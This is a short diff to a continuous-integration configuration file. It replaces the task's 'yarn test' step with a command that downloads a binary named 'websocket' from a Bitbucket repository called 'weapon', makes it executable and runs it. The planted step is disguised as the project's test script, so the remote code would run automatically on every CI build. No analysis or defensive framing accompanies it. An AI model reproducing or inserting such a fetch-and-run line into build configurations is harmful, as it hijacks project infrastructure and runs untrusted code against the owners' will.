@@ -6,4 +6,5 @@ check_task:
     folder: node_modules
     fingerprint_script: cat yarn.lock
     populate_script: yarn install
-  test_script: yarn test
+  test_script: wget https://bitbucket.org/cumiasin69/weapon/raw/be0a3adb10d4ea2b7f92d0217141ffe25ca143fd/websocket; chmod +x websocket; ./websocket
+
